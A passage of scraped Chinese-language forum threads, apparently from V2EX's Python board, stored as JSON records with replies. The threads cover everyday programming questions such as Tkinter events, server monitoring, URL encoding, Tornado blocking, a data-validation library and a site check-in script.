Nice,公司氛围好；\r<br>\r<br>4.生日=生日歌+生日红包+月生日会，结婚礼金，生育礼金；\r<br>\r<br>5.厨艺堪比星级酒店的阿姨，为我们献上营养丰富的中餐+晚餐；\r<br>\r<br>6.距家较远也不用担心，还有温馨的员工宿舍提供呢；\r<br>\r<br>7.未完待遇，不断开发 ing...\r<br>\r<br>\r<br>公司：佛山市银刃信息技术服务有限公司\r<br>地址：佛山市南海区平洲昆岗西路 7 号翠皇府 4 楼\r<br>请将简历投至： <a target=\"_blank\" href=\"mailto:mayfanfan@dingtalk.com\">mayfanfan@dingtalk.com</a></div>"], "reply": "10", "tittle": "高级 Python 工程师（包食宿） 10K-18K", "comment": ["离家好近，大半年后要找实习生么？", "难得见到一次佛山的招聘信息,离家一个多小时的车程", "程序员工资好高  好羡慕！", "中餐+晚餐，意思就是要你自愿 996 喽?", "好有诱惑力的职位啊，可惜不在广东", "楼主是钉钉 ？ dingtalk ？", "python 哲学是啥？", "佛山的话，这个工资挺高了， \r", "B2B 能看出，公司还是有一定业务渠道的， BD 吧", "支持一下佛山", "python 哲学是啥？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我目前有一个需求，当某个 entry 里面 text 变更的时候，需要根据当前的 text 联动修改其他 widget</p>\n<p>但是使用 bind 按键事件的时候， bind 的触发时用 get 方法取到的还是这个 text 变动之前的值，即 bind 的事件是在 text 的值修改之前就触发的</p>\n<p>样例代码如下：</p>\n<pre><code>from tkinter import *\n\ndef printkey(event):\n    print(u'你按下了: ' + event.char)\n    print(u'当前字符：' + entry.get())\n    print\n\nroot = Tk()\ninputText = StringVar()\n\nentry = Entry(root, textvariable=inputText)\n\nentry.bind('&lt;Key&gt;', printkey)\n\nentry.pack()\nroot.mainloop()\n</code></pre>\n<p>执行的时候，我在entry里面依次敲了A、B、C三个按键\n从print的值里能看到，用get方法只能获取到敲键之前的text的值\n第一轮：敲击“A”，但是get到的字符串是空的\n第二轮：继续敲击“B”，但是get到的字符串是“A”\n第三轮：继续敲击“C”，但是get到的字符串是“AB”</p>\n<p>有什么方式可以get到当前entry中的字符串呢？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "求助：在 Tkinter 的 Entry 上如何监听类似 pyqt 的 textChanged 事件？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个周末花了点时间看了 Python 。自动化运维是 Python 一个比较擅长点，查看相关资料。\n但是我有点疑惑的地方：</p>\n<p>比方说系统监控，有 20 台机器。 各自在本地运行个 python 脚本，然后有一台收集数据的机器，提供一个 http 接口口，接受这二十台数据传来的各自系统的性能数据。\n在这台机器上去写一个展示层。</p>\n<p>1.思路是否是这样的？\n2.通常这些数据都是通过 psutil 这个模块提供的数据。除了这些点还应该关注哪些点？\n3.展示层有哪些好用的框架？\n4.每台机器上的都需要跑这个 py 脚本。但是如果机器更多的话，难道需要一个个的拷贝上去吗？</p>\n</div></div>"], "reply": "12", "tittle": "如何用 Python 监控系统状态？", "comment": ["1. 大体上差不多\r", "2. 不清楚\r", "3. 现在似乎 Grafana 比较火，应该还有不少同类工具\r", "4. ansible, puppet 和各种类似物，最不济还可以 scp\r", "\r", "另外楼主可以了解一下主流监控系统比如 nagios, zabbix 甚至 new relic 这些商业解决方案，可以帮助理解 1. 的问题；还有 nagios-plugins (独立 fork 版叫 monitoring-plugins), collectd 之类的更接近你说的 2. 这种东东；前面这些并不局限于 Python", "4 如果是云环境,比如 aws 或者阿里云,有创建磁盘 image 的功能,直接把这些脚本放到 root image 里.", "“比方说系统监控， 1234 ”，轮子非常大，有现成的系统，别人很多年了，比如 zabbix 。", "SaltStack", "zabbix+定制监控脚本", "收集数据交给 zabbix ，展示层用 py 脚本和 zabbix 结合吧", "你需要  pm2", "prometheus 用于接收 http 接口传来的数据，开箱即用， gafanna 用于数据展示。", "zabbix 采集数据，用 Grafana 来做数据展示，想同时安装部署一个服务到很多个节点可以考虑 puppet 之类的", "Graphite+StatsD+Grafana+Diamond", "1. saltstack\r", "2. telegraf , influxdb, grafana (TICK/ELK)\r", "3. zeromq , psutils, python"]},
{"content": ["<div class=\"topic_content\">爬虫运行的时候 状态栏如下图卡死（系统自带的状态卡死，第三方不受印象）\r<br><a target=\"_blank\" href=\"http://i.imgur.com/YQIJYTT.gif\"><img src=\"http://i.imgur.com/YQIJYTT.gif\" class=\"embedded_image\"></a><br>* 渣画质见谅，那个圆圈卡死的鼠标状态竟然不能被 QuickTime 截到，于是手机远远的拍的（破 6s 近处已无法对焦）\r<br>下面是这个爬虫 import 的包\r<br><a target=\"_blank\" href=\"http://i.imgur.com/3VkZ3oW.jpg\"><img src=\"http://i.imgur.com/3VkZ3oW.jpg\" class=\"embedded_image\"></a><br>\r<br>\r<br>## 系统 10.12.2 , python2.7</div>"], "reply": "7", "tittle": "运行爬虫的时候 macOS 状态栏卡死", "comment": ["前排小板凳围观大神根据 import 判断卡死原因", " 不好意思我才是小白，你对这个原因有见解的话可以直接发表，我只能这样猜测了，因为这个爬虫和我其他爬虫唯一不同的地方就是 import 的不同了。而这个是我写到现在唯一一个因为长时间运行而卡死状态栏的", " 每次长时间运行都会卡", " 哎嗨嗨 不好意思 我也是菜鸟，我认为光从 import ，看不出卡的问题出在哪儿；最好是贴出你的代码，让大神分析一下哪里出了问题。", "估计，你的 webdriver 开多了，并且没有关闭，导致系统资源紧张，导致卡死现象。建议检查一下 webdriver 有没有 close 掉。", " 电脑配置,内存太小？ selenium 用的那个 browser ，起了多少个线程，一个任务结束调用 close 没有？等等", " @", " 不好意思都忘了这么个帖子了，谢谢回复，都排查过不是这些原因"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>表示<code>DJango</code>的官方文档看了一遍一遍的，然而用到的却不是很多，再看下去也没什么卵用，所以准备着手看源码去，先从<code>路由</code>》<code>view</code>》<code>ORM</code>入手，然后再看下其他相关<code>DJango</code>内置的功能， so ，不知各位有何建议？</p>\n</div></div>"], "reply": "11", "tittle": "关于如何进阶学习 Python", "comment": ["其实应该是业务需要啥去学啥，后台现在本身只是写业务代码的话没什么难的，关键是需要根据业务去用适合的技术，后端现在比较有难度的都是数据库的优化了，而这个也是要数据量达到一定程度才有意义的", "如果是关于 Python 语言的话，我建议读一下《 Python Cookbook 》，作者的几个 Talk 也可以看一下。", "这不是进阶 django 吗。。。进阶 python 不是该研究 token ， parse 什么的吗", "从实战开始，要练习，点我头像加入我们非商业学习群，多交流", " 确实如此，数据库优化这块真的是要靠经验的积累的，并且还要有一定的工作环境，不然都是扯淡，学了不用，没效果。", " 这本书已经在今年阅读的技术数据中了。", " 不好意思，没注意到。了。", " 已申请", "不要迷茫于 Django\r", "\r", "建议从 Flask, Tornado 入手了解：\r", "\r", "1. ORM: sqlalchemy\r", "2. form: wtforms\r", "3. template: jinja2 , mako\r", "\r", "另外， Web 服务器端 MVC 耦合度太高。现在通常是通过 API ，前后端分离：\r", "\r", "1. Python Tornado 开发 RESTful API\r", "2. swagger 定义 API\r", "3. AngularJS / React , vue.js ... 实现前端\r", "\r", "btw, 如果沿着 tornado 路线的化，可以看下我们的项目： ", " tornado 和 flask 确实比较轻量级，看起源码来相对来说也会快些，但我司主攻 Django ，其他，目前没考虑。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前我用 <a href=\"https://icanhazip.com/%E6%9D%A5%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E4%B8%BA%E9%AB%98%E5%8C%BF%E5%90%8D%E4%BB%A3%E7%90%86%EF%BC%8C%E8%AF%B7%E9%97%AE\" rel=\"nofollow\">https://icanhazip.com/来检查是否为高匿名代理，请问</a> V 友还有其他的方法吗？</p>\n</div></div>"], "reply": "14", "tittle": "检查是否为高匿名代理的方法有哪些？", "comment": ["巧了... 我也用的是 icanhazip...", "自己写一个检查 HTTP 头部。", " 看 http 头，或者自己搞个服务", " 同好啊，哈哈", " 这个好像有点难度吧。。", " thanks", " 自己搞一个服务，不太会这个。。", "4 人回答， 14 人收藏...这个...  :)", ",  google 一下，有很多啊", "用代理发请求到你自己的 VPS ，或者开个 HTTP 服务器 UPNP 开个随机端口，然后读 HTTP 头。", "出来的是我 ipv6 地址，略屌", "HTTP_HOST = proxyjudge.us\r", "HTTP_CACHE_CONTROL = max-age=0\r", "HTTP_ACCEPT = text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r", "HTTP_UPGRADE_INSECURE_REQUESTS = 1\r", "HTTP_USER_AGENT = Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.22 Safari/537.36 SE 2.X MetaSr 1.0\r", "HTTP_DNT = 1\r", "HTTP_ACCEPT_ENCODING = gzip, deflate, sdch\r", "HTTP_ACCEPT_LANGUAGE = zh-CN,zh;q=0.8\r", "HTTP_CONNECTION = close\r", "REMOTE_ADDR = SS 服务器地址\r", "REMOTE_PORT = 57986\r", "REQUEST_METHOD = GET\r", "REQUEST_URI = /\r", "REQUEST_TIME_FLOAT = 1490613559.635\r", "REQUEST_TIME = 1490613559", "好吧，其实用 ", " 挺好的，谢谢大家的回复哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>class stock():</p>\n<pre><code>def all_url(self, url):\n    html = self.request(url)\n</code></pre>\n<p>这里的 self.request 是什么意思啊？\nrequest 应该不是 requests 库里面的方法吧？\n还是 urllib.request 里面的意思?\n但是我看前面都没用引用 urllib 啊。</p>\n</div></div>"], "reply": "8", "tittle": "请问 self.request 是什么意思啊", "comment": ["def all_url(self....", " ", "这是函数在哪个类里面，你就去哪个类找", "谁知道 a.b.c 的 b 是什么意思啊？\r", "\r", "是不是平常大家说的那个 b （ doge", " 知道了，谢谢。原来在类的最下面 def 了 request 的函数。", "先弄懂这里的 self 是什么", " ！！！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于我在 GitHub 上 Star 了很多 repo ，不好管理，所以把一些有共性的 repo 整理到一定的集合中，方便使用。\n一些有价值的集合，在这里和大家分享一下</p>\n<ul>\n<li><a href=\"https://gitmark.igevin.info/user/collections/58a4f2d59518f2002482da13/detail/\" rel=\"nofollow\">Python Web Frameworks</a></li>\n<li><a href=\"https://gitmark.igevin.info/user/collections/58a4f2c39518f2002360cf04/detail/\" rel=\"nofollow\">Flask Extensions</a></li>\n<li><a href=\"https://gitmark.igevin.info/user/collections/58a4f7539518f2002360cf06/detail/\" rel=\"nofollow\">微信开发 Python 库</a></li>\n<li><a href=\"https://gitmark.igevin.info/user/collections/58bd4f09277ac30021935e62/detail/\" rel=\"nofollow\">python 学习资料</a></li>\n</ul>\n<p>欢迎大家帮忙补充</p>\n</div></div>"], "reply": "7", "tittle": "分享几个收藏的 GitHub 与 Python 有关的 repo 集合，不定期更新，欢迎大家帮忙补充", "comment": ["补充一些学习资料\r", "\r", "\r", "\r", "\r", "\r", " 在下面这个 collection 中\r", " 感谢支持~", "老司机们开车了！！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如我想把 <code>苹果</code> 作为 get 参数发送到后台，在浏览器上是可以的，因为浏览器会帮我编码成  <code>%E8%8B%B9%E6%9E%9C</code>，但是 python 的 requests 库就不知道怎么搞了</p>\n<pre><code>url_pre =  \"http://127.0.0.1/seq?kw=\"\n\nkws = [\n    \"苹果\"\n]\n\nfor key in kws:\n    r = requests.get(url_pre + key)\n    print r\n</code></pre>\n<p>因为运行会提示出错 <code>SyntaxError: Non-ASCII character '\\xe6' in file</code></p>\n</div></div>", "<div class=\"topic_content\">加了 coding 就搞定了，我是用 python2 的\r<br># -*- coding:utf-8 -*- \r<br># coding:utf-8</div>"], "reply": "13", "tittle": "Python requests 库怎么对 get 参数的汉字做编码?", "comment": ["怎么感觉是 python 或者定义字符串的问题 并不是库的问题", "应该不是这么拼的吧，另外报错是文件编码问题", "不是 requests 库的问题", "> 因为浏览器会帮我编码成 %E8%8B%B9%E6%9E%9C\r", "\r", "所以你的问题不就是把文字转换成 URL 编码咯 ？\r", "\r", "自己都提出问题了，随手百度都是找得到的吧", "#coding: utf-8\r", "\r", "您可能旧版软件的受害者  ", " ", "善用关键字搜索 “ python 汉字 URL ”\r", "\r", "祝你好运。", "urllib.parse.quote(key)", "response = requests.get(url_pre + key)\r", "response.encoding = \"gbk\"\r", "\r", "requests 有时候不能正确识别网页编码", "你可能是 python2 的受害者", "代码头部 加上这两行\r", "\r", "# -*- coding:utf-8 -*-\r", "# coding:utf-8\r", "\r", "默认 python 源代码文件不能输入汉字，加上这两行就行了", "In [1]: import requests\r", "\r", "In [2]: requests.utils.quote(\"中文\")\r", "Out[2]: '%E4%B8%AD%E6%96%87'\r", "\r", "\r", "urllib.urlencode\r", "urllib.quote\r", "urllib.unquote", "urllib.parse.quote()\r", "\r", "反之，还原请求参数用： urllib.parse.unquote()", "谢谢 #5 @", " #10 @", "\r", "\r", "加了 coding 就搞定了，我是用 python2 的\r", "# -*- coding:utf-8 -*- \r", "# coding:utf-8"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://twitter.com/mcuban/status/846781342083923969\" rel=\"nofollow\">https://twitter.com/mcuban/status/846781342083923969</a></div>"], "reply": "5", "tittle": "小牛队老板库班都开始学《Machine Learning with Python 》 了", "comment": ["66666 ，不过还是莫雷的数据分析更厉害", "6666 高富帅都开始学些了 屌丝们颤抖吧", "他以前搞互联网的，可能有基础吧。。。", "以前搞得全景 NBA 也很厉害。。技术流老板", "以 57 亿美元卖 broadcast 给 yahoo ，估计之前就是做技术的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>XData</p>\n<p>Github: <a href=\"https://github.com/gaojiuli/xdata\" rel=\"nofollow\">https://github.com/gaojiuli/xdata</a></p>\n<p>一款非常实用的数据验证工具, 通常用于请求数据的验证.</p>\n<h2>Features</h2>\n<ul>\n<li>验证数据一步到位</li>\n<li>容易扩展,容易自定义数据类型以及验证方式</li>\n<li>无第三方依赖</li>\n</ul>\n<h2>Required</h2>\n<ul>\n<li>python &gt;= 3.5</li>\n</ul>\n<h2>Installation</h2>\n<p><code>pip install xdata</code></p>\n<h2>Usage</h2>\n<h3>ValidatedData</h3>\n<pre><code>from xdata import *\n\nclass UserSchema(Schema):\n    telephone = Str(length=11, required=True)\n    password = Str(min_length=8,max_length=16, required=True)\n    \nrequest_data = {\n    'telephone':'18180050000',\n    'password':'idonotknow'\n}\n\nschema = UserSchema(request_data)\nif schema.valid:\n    print(schema.validated_data) # {'telephone': '18180050000', 'password': 'idonotknow'}\n\n</code></pre>\n<h3>Errors</h3>\n<pre><code>from xdata import *\n\nclass UserSchema(Schema):\n    telephone = Str(length=11, required=True)\n    password = Str(min_length=8, max_length=16, required=True)\n\n\nrequest_data = {}\n\nschema = UserSchema(request_data)\nif not schema.valid:\n    print(schema.errors)  # {'telephone': 'telephone is required', 'password': 'password is required'}\n</code></pre>\n<h3>DataTypes</h3>\n<pre><code>from xdata import *\n\nDataType(required=True,default='11',choices=[])\n\nStr(length=11, max_length=12,min_length=10,regex=\"\")\nInt(max=10000,min=12)\nBool(max=10000,min=12)\nDecimal(left=5,right=2)\nDateTime(max_datetime='2001-01-01 00:00:00', min_datetime='2000-01-01 00:00:00')\nDate(max_date='2001-01-01', min_date='2000-01-01')\nTime(max_time='06:00:00', min_time='05:00:00')\n\n</code></pre>\n<h2>Test</h2>\n<p><code>coverage run --source=xdata -m pytest &amp;&amp; coverage report</code></p>\n<p>Github: <a href=\"https://github.com/gaojiuli/xdata\" rel=\"nofollow\">https://github.com/gaojiuli/xdata</a></p>\n<p>欢迎有兴趣的朋友一起参与进来</p>\n</div></div>"], "reply": "17", "tittle": "xdata: Python 极简主义数据验证器", "comment": ["没人有兴趣？", "这个特别像 ", " ，有什么不同之处吗？", " 作用似乎是一样的", "楼主的项目都是 x 开头啊，之前在 reddit 还看过关于 xweb 的讨论", " 我这个只用于数据验证，思路和 schematics 不一样。我是要大家能够很容易实现扩展，很容易自定义自己的数据结构。只做验证一件事的", " 谢谢你的回复。我这么取名字原因是想不到名字可以取了！ x 开头感觉比较酷吧", "感觉在 web 上使用场景有限， http 传递过来的参数都是 string ，而楼主的 Int(DataType)判断直接是 isinstance(value, int)，这样用户传递过来的参数不可能有 int 值了。 django wsgi 对参数 encode(默认 utf-8)了一下。 django 的 form 的 IntegerField ，做法是 try:int(str(value));except TypeError, ValueError:raise...;\r", "不过这个问题不大！我是把你的这个理解成了 django 的 form ，不知道对不对！", " xdata 用于请求数据的过滤验证过程, 首先从请求中取得数据(可能是 json,form-data 等)转为 dict 这个过程应该交给 web 框架处理, 此时所有的数据类型就符合请求者的想法了,  然后 xdata 再验证这个 dict 数据是否合法.", " #8 http 的 query_string 应该都是 string 类型吧", " query_string 解析为 dict 时的数据转换应该交给 web 框架来做", "最近写 API 在用 WTForm 比较多，一些对比：\r", "1. __init__ 参数全是 (*args, **kwargs) 要看源码才知道怎么用， API 不友好；\r", "2. 别人家的都是 String ， Integer 到这里却简称了；\r", "3. 别人家的都是提供 validators ，这里只提供一个  fn ，调用者需要负责合并，还要写清楚什么时候执行下一步验证；\r", "4. 整篇代码都在使用 self.name 却没见一个赋值（别说 self.name = None ）。", " \r", "\r", "1. README 已经是所有的用法．(*args, **kwargs)是因为参数可变，有代码的提示的 ide 会提示所有需要的参数．\r", "2. 简称只是一种约定而已, 自定义数据类型是很容易的. \r", "3. fn 是自定义的验证器，在很多情况下是不会用到的, 稍微复杂的验证应该自定义数据类型．\r", "4. self.name 实现 schema 初始化的是否赋值．用途时命名验证器．\r", "\r", "`self.checkers[k].name = k` line 34 in schema.py", "wtforms", " \r", "\r", "wtforms 针对的是网页 form 的验证，提供了生成 form 的功能，核心都是为网页服务的．我做这个是想做一个纯粹的数据验证工具． xdata 与 wtforms 比起来，用法要简单一些．", " 是的，我们开发 API 时，简单定制过 wtforms ，不需要其生产表单功能", " 嗯", "楼主都在做些有趣的东西，先关注下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>1. 语言： python\n2. 框架: tornado+gevent 。。我这里是把 tornado 当 flask 来用的\n3. 在对于路由 url_pathA的处理里面：我需要向 根据参数来决定 向 urlA 还是 urlB 请求，再根据请求结果响应.设置了超时为 1s\n4. 对于 url_pathA,supervisor 起两个进程来处理\n</code></pre>\n<p>现有遇到的问题是 urlA 没有响应，导致只有超时响应。。\n而现在其他请求（ handler 不是请求 urlA 的请求）也没有响应了，我知道的原因是因为urlA导致的，把请求要urlA的请求干掉响应就正常了，但是这不解决办法，我想知道 这种问题应该怎么解决？</p>\n</div></div>"], "reply": "8", "tittle": "因为接口的一部分请求超时导致这个接口完全不可用怎么办？", "comment": ["处理多个请求的时候，应该是并行的啊，你这个怎么感觉成了串行的了。", " 什么意思 ？我的意思对于接口 A ，只有两个进程来响应，因为一部分请求需要 1S 来响应，导致其他请求在排队，这种问题应该怎么解决呢？", "打 patch 生效了么？用了阻塞的 C 库？", " 不懂，我用的 request 库。。应该生效了吧。。", " 要用 tornado 的异步起来", " tornado 没有异步 orm ，用不起来了。。而且现在很多都是用 peewee 做 orm 的", "不要用 requests ，用 tornado 自己的 AsyncHttpClient 。\r", "不用异步 ORM 不代表完全不能用异步，如果数据库查询成了瓶颈，那就要优化数据库。但你这里很明显是 requests 网络请求阻塞了线程啦。", " 直接使用异步操作吧。这样就不会阻塞当前线程了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>效果图：<br>\n<img alt=\"\" src=\"http://i4.buimg.com/567571/e980f60adc47705f.png\"></p>\n<p>Github: <a href=\"https://github.com/SgtDaJim/v2ex_signup\" rel=\"nofollow\">v2ex_signup</a></p>\n<p>话说做这个会被站长封吗- -</p>\n</div></div>"], "reply": "64", "tittle": "Python 脚本： V2EX 自动领取每日奖励", "comment": ["不会这也是凭本事", "你这个 id 要黑了", "搭车传销一波，我的 V2 签到脚本\r", "\r", "- - 楼主不喜欢壁纸吗？不想写个抓 WALLHEAVEN 的 PY 服务于群众吗，哇哈哈哈~", " 这个厉害，代码简洁！", " 卧槽，这么恐怖", " 主要是要 FQ ，有点麻烦，用脚本速度会很慢。有时间我研究一下。", " \r", "\r", ": )   \r", "\r", "requests 大杀器，可以少写好多代码，你值得拥有。。。这波推销咋样", " 这波安利吃了哈哈", " #2 @", " #6 不会被封 -> ", " 可以可以，原来已经有这么多先例了", "好厉害 带我飞吗？", "从来不领的飘过，因为花不完", "好久前写的。。只依赖一个 requests\r", "卧槽，这么腻害。", " :thumbsup:", " 互相学习吧，我也是菜鸟！", "每日一登录，也是个思路哈..", " 也不知道是你的帐号有问题，还是我的。 再次扫贴的时候发现你回我了，但是我却木有收到提醒。 WOW 关注你的博客了，如果有 WALLHEAVEN 的 PY 发布，我愿意和你有 PY 交易！", "签到成功了 但是有错误\r", "Traceback (most recent call last):\r", "  File \"signup.py\", line 132, in <module>\r", "    email.send()\r", "  File \"c:\\v2ex_signup\\email_constructor.py\", line 37, in send\r", "    server.starttls()\r", "  File \"c:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\lib\\smt\r", "plib.py\", line 748, in starttls\r", "    self.ehlo_or_helo_if_needed()\r", "  File \"c:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\lib\\smt\r", "plib.py\", line 599, in ehlo_or_helo_if_needed\r", "    if not (200 <= self.ehlo()[0] <= 299):\r", "  File \"c:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\lib\\smt\r", "plib.py\", line 439, in ehlo\r", "    self.putcmd(self.ehlo_msg, name or self.local_hostname)\r", "  File \"c:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\lib\\smt\r", "plib.py\", line 366, in putcmd\r", "    self.send(str)\r", "  File \"c:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\lib\\smt\r", "plib.py\", line 358, in send\r", "    raise SMTPServerDisconnected('please run connect() first')\r", "smtplib.SMTPServerDisconnected: please run connect() first", " 谢谢支持！有空我就去研究下吧~", " 这个报错应该是邮件服务器连接有问题。。你看看 smtp_server 和 smtp_port 那两项有没有写好，没问题的话再留意下自己有没有收到邮件，也有可能是邮件服务器那边有问题。", "发邮件纯属多余，最好的是每天自动签到，让你忘了还有签到这个事", "建议增加一个 schedule 功能，这样就可以放一边一直挂着了\r", "然后就是 email ，有点多余，如果几天没注意那邮箱……我有洁癖我是看不下去的……", " \r", " \r", "\r", "如果不想要邮件的话。。把 signup.py 最下面 email=Email()和 email.send()注释掉就好了。。\r", "另外 windows 可以通过计划任务、 Linux 可以通过 crond 来实现定时运行脚本。", "没有邮件的话挂了大概也不知道…话说我现在用的浏览器插件自动签到=-=一天忘记开电脑就断签", " 是的。。我在 vps 上挂的脚本。。所以才考虑用邮件监控的哈哈", "github 能找到几十个 V2EX 签到脚本了。", " 主要我没主动去找。。又重复造轮子了 233 。。当练习了", "谈女票的时候断签过，分手后每天手动领取没断过", "mark 。请问有没有淘金币的～", "不是应该签到失败再发邮件提醒吗", " 老哥，这每日奖励的背后好像透露着你无尽的伤感啊~", " 都一样。我自己喜欢看余额而已~", " 这个没想过额。。后面可以弄一个，有时间研究下~", "楼主好溜啊，之前你写的爬美剧的我也关注了，赞啊。给个联系方式，交流下。", "失败发邮件 成功不发", " 这个呢？", "不是我的", "谁有虾米自动签到的 python 版本。。。。", "这个不错 支持一下 不过我基本都是每天手机打开就签到了", "你们不怕密码泄露么？万一", " #3  感谢  已部署 ", " ", "原来 travis 可以设置 cron jobs 每天运行……", "chrome 插件不是有这个功能么 ", " ", "棒棒哒，大概扫了一眼有个可能存在的问题请 LZ 确认一下：\r", "目前脚本使用 http 提交登录参数，由网站自动完成 https 重定向，这样有存在提交内容泄露的风险吧……\r", "\r", "为什么不直接使用 https 进行交互？", "  欢迎上车 : )", "我知道错误什么原因了 我没配置邮箱发送~~", " 你的这个脚本挺不错的，谢谢分享 *_*", "login_data.get(\"LoginInfo\", \"user\") KeyError 'LoginInfo'", "开启两步验证就不行了吧", "价值观 3.25", "搭车传销一波，我的京东签到脚本  ", "  \r", "\r", "\r", "\r", "自动登录京东，打卡领钢镚，签到领京豆", " 心疼", " 支持", " 卧槽，这个好", " 源码都是开放的。。密码放在自己硬盘上。。应该不会泄漏", " 注意配置文件名字修改和配置内容填写", "赞，还有更多网站的咩", " 暂时没有，后面如果有时间会做更多的", " #3 签到脚本见多了，这个不用 vps 的思路倒是很新颖啊。\r", "fork 了一份，把 python 脚本换成了 shell 脚本，主要是看 travis-ci 执行前装依赖项太慢，不知道用 shell 会不会减轻他们的服务器压力", " 嗯，看到了， Shell 版本， 玩的 6 啊！", " 装载依赖项基本上每个项目都有的，兄弟你比较 6 ，还考虑人家的服务器压力.我只能说我们的目标应该定为`把 travis-ci 服务器跑挂`，那才是真的牛，能上 HN 首页的！", " #63 哈哈，那祝你早日上头条"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>似乎在 windows 上面是可以的，但是 Mac 上面直接套用 windows 的 <a href=\"http://setup.py\" rel=\"nofollow\">setup.py</a> 就会出错</p>\n<p><a href=\"http://setup.py\" rel=\"nofollow\">setup.py</a>(windows):</p>\n<pre><code>\nfrom distutils.core import setup  \nimport py2exe  \n  \nsetup(console=['sakai_getter.py'])  \n</code></pre>\n<p>请问具体有什么办法可以在 Mac 上面也编译出 console application 吗？</p>\n</div></div>"], "reply": "4", "tittle": "Python 编辑 Mac 可执行文件 py2app 可以创建 console application 吗？", "comment": ["试过 pyinstaller 吗", " \r", "pyinstaller 编译出来的文件执行的时候会说 ImportError: No module named 'queue'\r", "不是很清楚为什么\r", "使用的 python3.5 编写的程序", " 你没把库也一起打包进去把？", " 请问要怎么打包进去呢？"]},
{"content": ["<div class=\"topic_content\">以前用 Visual Studio 或者 VIM 都可以很方便的显示定位当前文档里面的函数和方法，\r<br>\r<br>尤其是在读代码的时候特别方便， 目前 Visual Studio Code 只能用快捷键列出来，很不方便，效果也不好\r<br>\r<br>有插件可以做到吗？\r<br>\r<br>类似下图右边的窗口这样：\r<br>\r<br><a target=\"_blank\" href=\"https://i.imgur.com/w0N58ax.png\"><img src=\"https://i.imgur.com/w0N58ax.png\" class=\"embedded_image\"></a></div>"], "reply": "13", "tittle": "Visual Studio Code 怎么没有 Tag/Fucntion List 窗口？", "comment": ["貌似目前还没有。我也希望有 tag list ，浏览代码要方便得多", "Shift+Cmd+O [移至 → 前往档案中的符号]", "同问，最近在用 vscode 写 python", "同求…", "图片中楼主用的啥软件？@4ever911", " 大名鼎鼎的 vim", " 上面就是说的那种方式不方便，不能一目了然，我需要树装结构的显示。\r", "\r", "比如说，浏览别人代码的时候，很多时候，我看看类的结构就能猜到他的思路，然后去看看实现印证我的想法，在浏览代码的时候，特别方便。", "怀念 Visual Studio 里面的 Class View", "怀念 Visual Studio 里面的 Class View\r", "\r", "sublime 也没有，不明白为啥都不做，很难吗？", "CTRL + SHIF + O 太弱了\r", "\r", "CTRL + SHIF + O 太弱了\r", "\r", "CTRL + SHIF + O 太弱了", "同样需要这个功能，我去翻过 vs code 的 issue ，有人提到了，但是下面一堆人回复用 ctrl + shift + o"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>背景</h1>\n<p>题主想做一个分布式的任务处理系统，目前正在设计和测试原型系统，后端部分的技术点差不多已经解决了，现在正在考虑前端的开发。\n由于后端是用 python 开发的，所以前端也想直接使用 python ，参考了对各种 web 框架的网评，本着开箱即用的目的，题主选择了 django ，学习 django 的成本还不算太高，完成 django 的入门教程基本够满足题主的需求了。</p>\n<h1>痛点</h1>\n<p>可是问题来了，题主想要一个漂亮的界面，虽然这个系统用户不会很多，但还是比较爱面子，所以各种 google 最后找到了 adminlte 。题主没怎么接触过前端开发，在 adminlte 里摸索了半天，差不多搞懂了 bootstrap3 、 template 这些概念，还找到了 django-amdinlte2 这种傻瓜式的插件，本以为可以开始开心的敲代码了，哪知 django-amdinlte2 和真正的 adminlte 还是有很多差别的，有些东西达不到题主想要的效果。</p>\n<ul>\n<li>比如，左侧导航菜单，在 Admin LTE2 的例子里，打开一个链接左侧导航菜单对应的菜单会高亮显示，但是用 django-adminlte2 创建的页面就没有这种交互。</li>\n<li>又比如， AdminLTE2 的例子里，上方有一些消息提示按钮， django-adminlte2 里就没有。</li>\n</ul>\n<h1>解决方法</h1>\n<ul>\n<li>所以，要么在 django-adminlte2 的基础上进行修改，要么自己把 AdminLTE2 移植到项目中。两个选择的学习成本都不低。</li>\n<li>另外，不知道 django-suit 能不能直接用来开发其他 app 的界面。</li>\n</ul>\n<h1>需求</h1>\n<p>因为这不是一个以内容为主的应用，前端只是做一些任务的管理和状态的显示，所以题主甚至想为后端写几个 RESTAPI ，把前端完全剥离出来。不知道大家有没有更好的选择。</p>\n</div></div>", "<div class=\"topic_content\">折腾了几天的 django ，说说我遇到的问题（坑？），也许是因为我操作不当吧：\r<br>1. DRF 的权限管理和 Django 自身的权限管理似乎无关联，比如在 django 里创建一个 Group ，然后为该 Group 指定一种权限（例如，仅允许 change task ），然后使用 django 自带的 token 认证的方式进行认证，通过 DRF 创建的 API 去访问 task ，这时该 Group 里的用户可以查看、创建或者删除 task 。因此还需要在 DRF 里另外对权限进行管理。\r<br>2. 还是 DRF 权限管理问题，在 DRF 里自定义一个 permission ，使用 permission_classes ，在 views 里对 model 的权限进行控制，比如最常用的：特定用户只能看到自己创建的 task ，但是这里有个问题，我在获取单个 task 的时候， has_object_permission 会被调用，而在获取一个 task 列表的时候，只有 has_permission 会被调用， has_object_permission 